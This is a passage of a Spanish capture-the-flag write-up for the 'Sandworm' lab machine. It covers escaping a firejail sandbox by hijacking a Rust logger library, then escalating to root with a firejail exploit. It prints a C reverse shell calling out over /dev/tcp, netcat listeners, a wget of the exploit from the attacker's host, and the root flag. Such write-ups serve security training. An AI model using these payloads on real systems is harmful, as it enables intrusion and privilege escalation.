<span class="mtk1">            conn</span><span class="mtk5">.</span><span class="mtk8">exec_drop</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">stmt_insert, </span><span class="mtk8">params!</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk4">"timestamp"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> date,</span>
<span class="mtk1">                </span><span class="mtk4">"data"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> contents,</span>
<span class="mtk1">                </span><span class="mtk4">"hash"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">hash_hex,</span>
<span class="mtk1">                },</span>
<span class="mtk1">                )</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk8 mtku">logger</span><span class="mtk5">::</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">"ROUTINE"</span><span class="mtk1">, </span><span class="mtk4">" - "</span><span class="mtk1">, </span><span class="mtk4">"Pulling fresh submissions into database."</span><span class="mtk1">);</span>
</code></pre></div><p>El directorio es <code>/var/www/html/SSA/SSA/submissions</code>, donde <code>atlas</code> tiene permisos de lectura y escritura:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ ls -la /var/www/html/SSA/SSA  
total 44
drwxrwxr-x 7 atlas atlas 4096 Jun  7 15:18 <span class="code-blue">.</span>
drwxrwxr-x 3 root  atlas 4096 May  4 14:58 <span class="code-blue">..</span>
-rw-r--r-- 1 root  atlas 6897 Jun  7 15:18 app.py
-rw-r--r-- 1 root  atlas  746 May  4 17:45 __init__.py
-rw-r--r-- 1 root  atlas  245 Feb  2 14:43 models.py
drwxr-xr-x 2 root  atlas 4096 May  4 15:00 <span class="code-blue">__pycache__</span>
drwxr-xr-x 5 root  atlas 4096 Jan 31 16:20 <span class="code-blue">src</span>
drwxr-xr-x 4 root  atlas 4096 May  4 16:37 <span class="code-blue">static</span>
drwxr-xr-x 2 atlas atlas 4096 May  5 09:06 <span class="code-blue">submissions</span>
drwxr-xr-x 2 root  atlas 4096 May 30 04:54 <span class="code-blue">templates</span>
</code></pre></div><p>Aunque <code>atlas</code> está en la <em>sandbox</em>, el directorio anterior está disponible desde <code>firejail</code> porque las opciones lo permiten:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">/opt/crates/logger</span>$ cat /home/atlas/.config/firejail/webapp.profile
noblacklist /var/run/mysqld/mysqld.sock

hostname sandworm
seccomp

noroot
allusers

caps.drop dac_override,fowner,setuid,setgid
seccomp.drop chmod,fchmod,setuid

private-tmp
private-opt none
private-dev
private-bin /usr/bin/python3,/usr/local/bin/gpg,/bin/bash,/usr/bin/flask,/usr/local/sbin/gpg,/usr/bin/groups,/usr/bin/base64,/usr/bin/lesspipe,/usr/bin/basename,/usr/bin/filename,/usr/bin/bash,/bin/sh,/usr/bin/ls,/usr/bin/cat,/usr/bin/id,/usr/local/libexec/scdaemon,/usr/local/bin/gpg-agent  

#blacklist ${HOME}/.ssh
#blacklist /opt

blacklist /home/silentobserver
whitelist /var/www/html/SSA
read-write /var/www/html/SSA/SSA/submissions

noexec /var/www/html/SSA/SSA/submissions
read-only ${HOME}
read-write ${HOME}/.gnupg
</code></pre></div><h3 id="_library-hijacking_"><em>Library Hijacking</em></h3><p>La clave para obtener acceso como <code>atlas</code> es modificar el proyecto <code>logger</code>, ya que se utiliza en <code>tipnet</code>. Si ejecutamos <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> para enumerar procesos de ejecución, veremos estos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-blue">CMD: UID=0    PID=2326   | /bin/sudo -u atlas /usr/bin/cargo run --offline</span>
<span class="code-blue">CMD: UID=0    PID=2322   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline</span>  
</code></pre></div><p>Entonces, <code>atlas</code> está ejecutando el proyecto <code>tipnet</code>, que llama a <code>logger</code> por detrás. Nótese que el proyecto <code>logger</code> no se reconstruye al ejecutar <code>tipnet</code>. Por lo tanto, podemos agregar más código en <code>lib.rs</code> y compilar el proyecto, de manera que <code>tipnet</code> use una versión modificada de <code>logger</code> que nos dé acceso como <code>atlas</code> (fuera de la jaula).</p><p>Este es el archivo <code>lib.rs</code> modificado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">extern</span><span class="mtk1"> </span><span class="mtk5">crate</span><span class="mtk1"> chrono;</span>

<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk8 mtku">fs</span><span class="mtk5">::</span><span class="mtk8 mtku">OpenOptions</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk8 mtku">io</span><span class="mtk5">::</span><span class="mtk8 mtku">Write</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk8 mtku">process</span><span class="mtk5">::</span><span class="mtk8 mtku">Command</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">chrono</span><span class="mtk5">::</span><span class="mtk8 mtku">prelude</span><span class="mtk5">::*</span><span class="mtk1">;</span>

<span class="mtk5">pub</span><span class="mtk1"> </span><span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">log</span><span class="mtk1">(user</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">, query</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">, justification</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> _output </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Command</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">(</span><span class="mtk4">"/dev/shm/x"</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">output</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> now </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Local</span><span class="mtk5">::</span><span class="mtk8">now</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> timestamp </span><span class="mtk5">=</span><span class="mtk1"> now</span><span class="mtk5">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk4">"%Y-%m-%d %H:%M:%S"</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> log_message </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">format!</span><span class="mtk1">(</span><span class="mtk4">"[{}] - User: {}, Query: {}, Justification: {}</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, timestamp, user, query, justification);</span>  

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> file </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">match</span><span class="mtk1"> </span><span class="mtk8 mtku">OpenOptions</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/opt/tipnet/access.log"</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">Ok</span><span class="mtk1">(file) </span><span class="mtk5">=&gt;</span><span class="mtk1"> file,</span>
<span class="mtk1">        </span><span class="mtk8 mtku">Err</span><span class="mtk1">(e) </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Error opening log file: {}"</span><span class="mtk1">, e);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">    };</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk8 mtku">Err</span><span class="mtk1">(e) </span><span class="mtk5">=</span><span class="mtk1"> file</span><span class="mtk5">.</span><span class="mtk8">write_all</span><span class="mtk1">(log_message</span><span class="mtk5">.</span><span class="mtk8">as_bytes</span><span class="mtk1">()) {</span>
<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Error writing to log file: {}"</span><span class="mtk1">, e);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Intentaremos ejecutar un archivo en <code>/dev/shm/x</code>. Para garantizar que ejecutamos comandos como <code>atlas</code>, compilaremos un código en C para obtener una <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ cat &gt; /dev/shm/x.c
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main() {
  setuid(1000);
  system("bash -c 'bash -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'");  

  return 0;
}
^C
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">~</span>$ gcc -o /dev/shm/x /dev/shm/x.c
</code></pre></div><p>Ahora modificamos el proyecto <code>logger</code> y lo compilamos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">/tmp</span>$ cp /opt/crates/logger/src/lib.rs /tmp/lib.rs  
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">/tmp</span>$ vi /tmp/lib.rs
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">/tmp</span>$ cp /tmp/lib.rs /opt/crates/logger/src/lib.rs
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">/tmp</span>$ cd /opt/crates/logger/
<span class="code-green">silentobserver@sandworm</span>:<span class="code-blue">/opt/crates/logger</span>$ cargo build
<span class="code-green">   Compiling</span> autocfg v1.1.0
<span class="code-green">   Compiling</span> libc v0.2.142
<span class="code-green">   Compiling</span> num-traits v0.2.15
<span class="code-green">   Compiling</span> num-integer v0.1.45
<span class="code-green">   Compiling</span> time v0.1.45
<span class="code-green">   Compiling</span> iana-time-zone v0.1.56
<span class="code-green">   Compiling</span> chrono v0.4.24
<span class="code-green">   Compiling</span> logger v0.1.0 (/opt/crates/logger)
<span class="code-green">    Finished</span> dev [unoptimized + debuginfo] target(s) in 6.88s
</code></pre></div><p>En este punto, debemos esperar mientras escuchamos con <code>nc</code> hasta que llegue la <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.218:46024.
bash: cannot set terminal process group (2322): Inappropriate ioctl for device  
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
atlas@sandworm:/opt/tipnet$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
atlas@sandworm:/opt/tipnet$ export TERM=xterm
atlas@sandworm:/opt/tipnet$ export SHELL=bash
atlas@sandworm:/opt/tipnet$ stty rows 50 columns 158
</code></pre></div><p>Ahora estamos fuera de la <em>sandbox</em> y pertenecemos al grupo <code>jailer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:/opt/tipnet$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)  
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Usemos el <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25"><em>exploit</em> para <code>firejail</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:/opt/tipnet$ cd /tmp
atlas@sandworm:/tmp$ wget -q 10.10.17.44/exploit.py
atlas@sandworm:/tmp$ chmod +x exploit.py
atlas@sandworm:/tmp$ ./exploit.py
You can now run 'firejail --join=3065' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.  
</code></pre></div><p>Ahora necesitamos abrir otra <em>reverse shell</em> (llegará automáticamente) como <code>atlas</code> y ejecutar los comandos de arriba (<code>su -</code> en lugar de <code>sudo su -</code>) para convertirnos en <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.218:55424.
bash: cannot set terminal process group (2902): Inappropriate ioctl for device  
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
atlas@sandworm:/opt/tipnet$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
atlas@sandworm:/opt/tipnet$ export TERM=xterm
atlas@sandworm:/opt/tipnet$ export SHELL=bash
atlas@sandworm:/opt/tipnet$ stty rows 50 columns 158
atlas@sandworm:/opt/tipnet$ firejail --join=3065
changing root to /proc/3065/root
Warning: cleaning all supplementary groups
Child process initialized in 7.20 ms
atlas@sandworm:/opt/tipnet$ su -
root@sandworm:~# cat /root/root.txt
53da0e08e763ff3a5ba2f84e94c95fc1
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#jugando-con-pgp">Jugando con PGP</a></li><li><a href="#encontrando-ssti">Encontrando SSTI</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a><ul><li><a href="#escapando-de-la-jaula">Escapando de la jaula</a></li></ul></li><li><a href="#movimiento-lateral-al-usuario-atlas">Movimiento lateral al usuario <code>atlas</code></a><ul><li><a href="#_library-hijacking_"><em>Library Hijacking</em></a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>